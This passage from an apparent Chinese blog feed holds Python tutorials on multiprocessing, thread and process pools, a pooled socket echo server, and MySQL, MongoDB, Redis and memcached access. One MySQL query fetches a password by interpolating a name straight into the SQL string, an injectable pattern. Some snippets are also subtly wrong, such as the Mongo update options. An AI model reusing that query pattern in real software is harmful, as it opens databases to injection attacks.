time.sleep(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><h6 id="终止进程"><a href="#终止进程" class="headerlink" title="终止进程"></a>终止进程</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 终止进程</span></span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">()</span>:</span></span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br><span class="line">    print(multiprocessing.current_process())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    p = multiprocessing.Process(target=func)</span><br><span class="line">    p.start()</span><br><span class="line">    time.sleep(<span class="number">2</span>) <span class="comment"># 主进程2s</span></span><br><span class="line">    p.terminate()   <span class="comment"># 结束,主进程结束，不管子进程有没有结束，就终止子进程（线程没有这个）</span></span><br></pre></td></tr></table></figure><h6 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 面向对象 类继承创建进程</span></span><br><span class="line"><span class="comment"># start() --&gt; run(已经是在新的进程了) --&gt; target   # target是由默认的run运行</span></span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">My_Process</span><span class="params">(multiprocessing.Process)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        super().__init__(args, kwargs)</span><br><span class="line">        print(<span class="string">"初始化..."</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        start 默认调用的方法   重写啦在这里</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        print(<span class="string">"run..."</span>)</span><br><span class="line">        self.task()</span><br><span class="line">        time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">task</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"task..."</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    p = My_Process()</span><br><span class="line">    p.start()   <span class="comment"># start 方法会调用run</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建进程的方式 ： multiprocessing.Process     类继承，重写run     linux下：fork</span></span><br><span class="line"><span class="comment"># 如果换成是线程的话：换掉继承类就行</span></span><br></pre></td></tr></table></figure><h6 id="进程通信"><a href="#进程通信" class="headerlink" title="进程通信"></a>进程通信</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Manager  <span class="comment"># 管理器</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(l)</span>:</span></span><br><span class="line">    l.append(<span class="number">111</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    manager = Manager()  <span class="comment"># 实例化  先开启一个公共进程，并返回一个管理器</span></span><br><span class="line">    l = manager.list()   <span class="comment"># 开启空间，左边就是代理</span></span><br><span class="line">    <span class="comment"># l = manager.dict()</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    一般常用的空间类型是：</span></span><br><span class="line"><span class="string">    1.  mgr.list()</span></span><br><span class="line"><span class="string">    2.  mgr.dict()</span></span><br><span class="line"><span class="string">    3.  mgr.Queue()</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    print(l)</span><br><span class="line">    p = multiprocessing.Process(target=func, args=(l,))</span><br><span class="line">    p.start()</span><br><span class="line">    p.join()</span><br><span class="line">    print(l)   <span class="comment"># 这样使用manager之后 l就是【共享】的了</span></span><br></pre></td></tr></table></figure><p>进程池 &amp; 线程池</p><p>ps:有点乱</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from multiprocessing import Pool   # 进程池</span></span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool  <span class="comment">#线程池</span></span><br><span class="line"><span class="keyword">from</span> multiprocessing.pool <span class="keyword">import</span> ThreadPool <span class="comment"># 线程池</span></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(i)</span>:</span></span><br><span class="line">    print(<span class="string">"&#123;&#125;-------555"</span>.format(i))</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_back</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">    print(<span class="string">"处理数据完成"</span>,args, kwargs)</span><br><span class="line"></span><br><span class="line">pool = Pool(<span class="number">6</span>)   <span class="comment"># 不写的话 默认是cpu的个数</span></span><br><span class="line"><span class="comment"># print(threading.active_count())</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    pool.apply_async(func=func, args=(i,), callback=print_back)  <span class="comment">## 添加任务   不阻塞    主要使用的方法</span></span><br><span class="line"><span class="comment">#     pool.apply(func=func, )  ## 添加任务   阻塞</span></span><br><span class="line"><span class="comment"># pool.map(func, [i for i in range(5)])   #添加任务  不阻塞</span></span><br><span class="line"></span><br><span class="line">pool.close()   <span class="comment">#关闭线程池  不在提交新的任务</span></span><br><span class="line">pool.join()    <span class="comment">#等待进程池中的任务执行完毕</span></span><br><span class="line">print(<span class="string">"任务结束"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">########### 线程池的步骤</span></span><br><span class="line">p = ThreadPool(<span class="number">3</span>) <span class="comment"># 实例化</span></span><br><span class="line">p.apply_async(func) <span class="comment"># 函数      # 可以将返回值.get() 但是get也会i阻塞</span></span><br><span class="line">p.close()</span><br><span class="line">p.join()   <span class="comment"># join()语句要放在close()语句后面</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 进程池比线程池耗费资源</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以将返回值.get() 但是get也会i阻塞</span></span><br><span class="line">async_result = p.apply_async(func) <span class="comment"># 函数</span></span><br><span class="line">print(async_result.get())</span><br></pre></td></tr></table></figure><h6 id="使用进程池来实现并发服务器"><a href="#使用进程池来实现并发服务器" class="headerlink" title="使用进程池来实现并发服务器"></a>使用进程池来实现并发服务器</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用池来实现并发服务器</span></span><br><span class="line"><span class="comment"># 先开一个进程池， 每个进程下面再开一个线程</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool, cpu_count</span><br><span class="line"><span class="keyword">from</span> multiprocessing.pool <span class="keyword">import</span> ThreadPool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">woeker_thread</span><span class="params">(conn)</span>:</span>  <span class="comment"># 使用线程池来</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        recv_data =conn.recv(<span class="number">1000</span>)</span><br><span class="line">        <span class="keyword">if</span> recv_data:</span><br><span class="line">            print(recv_data)</span><br><span class="line">            conn.send(recv_data)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            conn.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">worker_process</span><span class="params">(server)</span>:</span> <span class="comment"># 使用进程池来接收套接字</span></span><br><span class="line">    <span class="comment"># pool = Pool(cpu_count()*2)     # 通常可以分配2倍的cpu个数</span></span><br><span class="line">    pool = ThreadPool(cpu_count()) <span class="comment"># 获取电脑核心数</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        conn, addr = server.accept()</span><br><span class="line">        pool.apply_async(woeker_thread, args=(conn,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    server = socket.socket()</span><br><span class="line">    server.bind((<span class="string">'127.0.0.1'</span>, <span class="number">8888</span>))</span><br><span class="line">    server.listen(<span class="number">1000</span>)</span><br><span class="line">    n = cpu_count()  <span class="comment"># 获得当前计算机的cpu核心数量</span></span><br><span class="line">    pool = Pool(n)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):  <span class="comment"># 充分利用cpu，为每个cpu分配一个进程</span></span><br><span class="line">        <span class="comment"># conn, addr = server.accept()</span></span><br><span class="line">        pool.apply_async(func=worker_process, args=(server,))</span><br><span class="line">        pool.apply_async(func=worker_process, args=(server,))</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;并发：&lt;/strong&gt;   任务数大于cpu个数&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;并行：&lt;/strong&gt;    cpu个数和任务数相同&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;GIL 锁:&lt;/strong&gt;   任何python进程中，一次永远只有一个线程运行&lt;/p
      
    
    </summary>
    
      <category term="Python" scheme="http://www.xpshuai.cn/categories/Python/"/>
    
    
      <category term="Python" scheme="http://www.xpshuai.cn/tags/Python/"/>
    
      <category term="进程" scheme="http://www.xpshuai.cn/tags/%E8%BF%9B%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>python-数据库编程</title>
    <link href="http://www.xpshuai.cn/python-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BC%96%E7%A8%8B/"/>
    <id>http://www.xpshuai.cn/python-数据库编程/</id>
    <published>2020-02-24T06:01:04.000Z</published>
    <updated>2020-02-24T07:00:26.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Python-DBA-API"><a href="#Python-DBA-API" class="headerlink" title="Python DBA API"></a>Python DBA API</h2><h6 id="包含的内容"><a href="#包含的内容" class="headerlink" title="包含的内容"></a>包含的内容</h6><p><img src="/python-数据库编程/1.png"></p><h6 id="访问数据库流程"><a href="#访问数据库流程" class="headerlink" title="访问数据库流程"></a>访问数据库流程</h6><p><img src="/python-数据库编程/2.png"></p><h4 id="与MySQL"><a href="#与MySQL" class="headerlink" title="与MySQL"></a>与MySQL</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line">db_config = &#123;</span><br><span class="line">    <span class="string">'host'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'user'</span>: <span class="string">'hhh'</span>,</span><br><span class="line">    <span class="string">'password'</span>: <span class="string">'123'</span>,</span><br><span class="line">    <span class="string">'db'</span>: <span class="string">'test'</span>,</span><br><span class="line">    <span class="string">'charset'</span>: <span class="string">'utf8'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 插入</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    conn = pymysql.connect(**db_config)</span><br><span class="line">    cursor = conn.cursor()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 插入</span></span><br><span class="line">    id = <span class="string">'2018002'</span></span><br><span class="line">    name =  <span class="string">'admin'</span></span><br><span class="line">    age = <span class="number">18</span></span><br><span class="line">    <span class="comment"># insert into student values(id,name,age)</span></span><br><span class="line">    sql = <span class="string">'insert into student(id, name, age) values(%s,%s,%s)'</span></span><br><span class="line">    cursor.execute(sql, (id, name, age))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 删除</span></span><br><span class="line">    <span class="comment"># table = 'students'</span></span><br><span class="line">    <span class="comment"># condittion = 'age &gt; 20'</span></span><br><span class="line">    <span class="comment"># sql = 'delete from &#123;table&#125; where &#123;condittion&#125;'.format(table=table, condittion=condittion)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 查询</span></span><br><span class="line">    sql = <span class="string">"SELECT password FROM admin WHERE name='%s'"</span> % (name)</span><br><span class="line">    cursor.execute(sql)</span><br><span class="line">    pws = cursor.fetchall()</span><br><span class="line">   </span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">'error'</span>)</span><br><span class="line">    conn.rollback()</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    conn.commit() <span class="comment"># 数据有变动一定记得提交/双保险</span></span><br><span class="line">    cursor.close()</span><br><span class="line">    conn.close()</span><br></pre></td></tr></table></figure><h6 id="cursor对象支持的方法"><a href="#cursor对象支持的方法" class="headerlink" title="cursor对象支持的方法"></a>cursor对象支持的方法</h6><p><img src="/python-数据库编程/3.png"></p><h4 id="与MongoDB"><a href="#与MongoDB" class="headerlink" title="与MongoDB"></a>与MongoDB</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pymongo <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#建立连接</span></span><br><span class="line">client = MongoClient(<span class="string">'127.0.0.1'</span>,<span class="number">27017</span>)</span><br><span class="line"><span class="comment">#指定数据库</span></span><br><span class="line">db = client.test</span><br><span class="line"><span class="comment">#指定集合</span></span><br><span class="line">collection = db.col</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(type(collection),collection)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># python连接mongodb就搞定</span></span><br><span class="line">mydict =&#123;</span><br><span class="line">    <span class="string">'_id'</span>: <span class="number">6</span>,</span><br><span class="line">    <span class="string">'name'</span>: <span class="string">'admin'</span>,</span><br><span class="line">    <span class="string">'age'</span>: <span class="number">18</span>,</span><br><span class="line">    <span class="string">'addr'</span>: <span class="string">'didu'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># collection.insert(mydict)</span></span><br><span class="line"><span class="comment"># print(collection.find())</span></span><br><span class="line"><span class="comment"># for i in collection.find():</span></span><br><span class="line"><span class="comment">#     print(i)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in collection.find(&#123;'name':'zhanglinlin'&#125;):</span></span><br><span class="line"><span class="comment">#     print(i)</span></span><br><span class="line"></span><br><span class="line">collection.update(&#123;<span class="string">'name'</span>:<span class="string">'zhanglinlin'</span>&#125;,&#123;<span class="string">'$set'</span>:&#123;<span class="string">'age'</span>:<span class="number">22</span>&#125;&#125;,&#123;<span class="string">'mult'</span>:<span class="string">'true'</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># collection.remove()</span></span><br></pre></td></tr></table></figure><h4 id="与redis"><a href="#与redis" class="headerlink" title="与redis"></a>与redis</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"></span><br><span class="line"><span class="comment"># # 连接,给定参数ip/port， redis默认端口6379</span></span><br><span class="line">r = redis.Redis(host=<span class="string">'127.0.0.1'</span>, port=<span class="string">'6379'</span>)</span><br><span class="line"><span class="comment"># # print(type(r),r)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># # 设置键值对</span></span><br><span class="line">r.set(<span class="string">'name'</span>, <span class="string">'admin'</span>)</span><br><span class="line"><span class="comment"># # 获取该键的值</span></span><br><span class="line">str = r.get(<span class="string">'name'</span>)</span><br><span class="line">print(str.decode(<span class="string">'utf-8'</span>)) <span class="comment"># 解码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 自动解码 参数：decode_responses=True</span></span><br><span class="line">r = redis.Redis(host=<span class="string">'127.0.0.1'</span>,port=<span class="string">'6379'</span>,decode_responses=<span class="literal">True</span>)</span><br><span class="line">r.set(<span class="string">'name'</span>,<span class="string">'哈哈'</span>)</span><br><span class="line">str = r.get(<span class="string">'name'</span>)</span><br><span class="line">print(str)</span><br><span class="line"></span><br><span class="line"><span class="comment">## StrictRedis</span></span><br><span class="line">r = redis.StrictRedis(host=<span class="string">'127.0.0.1'</span>,port=<span class="string">'6379'</span>)</span><br><span class="line">r.set(<span class="string">'name'</span>,<span class="string">'哈哈'</span>)</span><br><span class="line">str = r.get(<span class="string">'name'</span>)</span><br><span class="line">print(str,str.decode(<span class="string">'utf-8'</span>))</span><br><span class="line"><span class="comment">## `Redis`和`StrictRedis`区别：Redis兼容旧版本python2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">k_v = &#123;</span><br><span class="line">    <span class="string">'a1'</span>:<span class="string">'a'</span>,</span><br><span class="line">    <span class="string">'a2'</span>:<span class="string">'b'</span>,</span><br><span class="line">    <span class="string">'a3'</span>:<span class="string">'c'</span></span><br><span class="line">&#125;</span><br><span class="line">r = redis.StrictRedis(host=<span class="string">'127.0.0.1'</span>,port=<span class="string">'6379'</span>)</span><br><span class="line"><span class="comment"># 批量设置值</span></span><br><span class="line">r.mset(**k_v)</span><br><span class="line"><span class="comment"># 批量取值</span></span><br><span class="line">print(r.mget(<span class="string">'a1'</span>,<span class="string">'a2'</span>,<span class="string">'a3'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">r = redis.StrictRedis(host=<span class="string">'127.0.0.1'</span>,port=<span class="string">'6379'</span>)</span><br><span class="line"><span class="comment"># 往列表添加值从头部开始</span></span><br><span class="line">r.lpush(<span class="string">'list1'</span>,<span class="string">'haha'</span>)</span><br><span class="line">r.lpush(<span class="string">'list1'</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line"><span class="comment"># 获取列表值</span></span><br><span class="line">print(r.lrange(<span class="string">'list1'</span>,<span class="number">0</span>,<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">r = redis.StrictRedis(host=<span class="string">'127.0.0.1'</span>,port=<span class="string">'6379'</span>)</span><br><span class="line">r.sadd(<span class="string">'set1'</span>,<span class="string">'aa'</span>)</span><br><span class="line">r.sadd(<span class="string">'set2'</span>,<span class="string">'aa'</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="string">'bb'</span>)</span><br><span class="line">print(r.smembers(<span class="string">'set2'</span>))</span><br></pre></td></tr></table></figure><h4 id="与memcached"><a href="#与memcached" class="headerlink" title="与memcached"></a>与memcached</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> memcache</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立连接</span></span><br><span class="line">mc = memcache.Client([<span class="string">'127.0.0.1:11211'</span>], debug=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置一个</span></span><br><span class="line">mc.set(<span class="string">'name'</span>, <span class="string">'xps'</span>,time=<span class="number">60</span>)</span><br><span class="line"><span class="comment"># 设置多个</span></span><br><span class="line">mc.set_multi(&#123;<span class="string">"username"</span>:<span class="string">"handsome"</span>, <span class="string">"gender"</span>:<span class="string">"man"</span>&#125;, time=<span class="number">60</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取一个</span></span><br><span class="line">mc.get(<span class="string">'age'</span>)</span><br><span class="line"><span class="comment"># 获取多个</span></span><br><span class="line"><span class="comment"># 不管是元组还是列表都行，只要可迭代就行</span></span><br><span class="line">res1 = mc.get_multi((<span class="string">"username"</span>, <span class="string">"gender"</span>))</span><br><span class="line">res2 = mc.get_multi([<span class="string">"username"</span>, <span class="string">"gender"</span>])</span><br><span class="line"></span><br><span class="line">print(res1)</span><br><span class="line">print(res2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除一个</span></span><br><span class="line">mc.delete(<span class="string">"key"</span>)</span><br><span class="line"><span class="comment"># 删除多个</span></span><br><span class="line">mc.delete_multi([<span class="string">"key1"</span>, <span class="string">"key2"</span>])</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string"># 0表示永不过期  断电就会完蛋   适合做验证码</span></span><br><span class="line"><span class="string"># prepend 前插</span></span><br><span class="line"><span class="string"># append  后插</span></span><br><span class="line"><span class="string"># telnet ip port 远程连接</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure><p>这里仅仅做了简单的介绍，具体还需要自己练习中学习</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Python-DBA-API&quot;&gt;&lt;a href=&quot;#Python-DBA-API&quot; class=&quot;headerlink&quot; title=&quot;Python DBA API&quot;&gt;&lt;/a&gt;Python DBA API&lt;/h2&gt;&lt;h6 id=&quot;包含的内容&quot;&gt;&lt;a href=&quot;#
      
    
    </summary>
    
      <category term="Python" scheme="http://www.xpshuai.cn/categories/Python/"/>
    
    
      <category term="Python" scheme="http://www.xpshuai.cn/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>python-多线程</title>
    <link href="http://www.xpshuai.cn/python-%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    <id>http://www.xpshuai.cn/python-多线程/</id>
    <published>2020-02-24T03:29:58.000Z</published>
    <updated>2020-02-24T07:00:26.000Z</updated>
    
